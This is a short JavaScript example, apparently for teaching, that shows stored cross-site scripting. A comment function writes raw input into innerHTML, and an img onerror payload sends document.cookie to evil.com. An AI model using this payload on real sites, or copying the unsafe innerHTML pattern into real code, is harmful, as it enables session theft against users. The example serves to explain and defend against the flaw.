// Vulnerable: user input is written directly into the page
function displayComment(comment) {
    document.getElementById("comments").innerHTML += comment;
}

// An attacker submits this as their "comment":
const maliciousInput = "<img src=x onerror=\"fetch('https://evil.com/steal?cookie=' + document.cookie)\">";
displayComment(maliciousInput);

/*Because innerHTML renders raw HTML, the injected <img> tag executes its onerror handler as soon as the browser fails to load the fake image source, 
silently sending the victim's session cookie to an attacker-controlled server.*/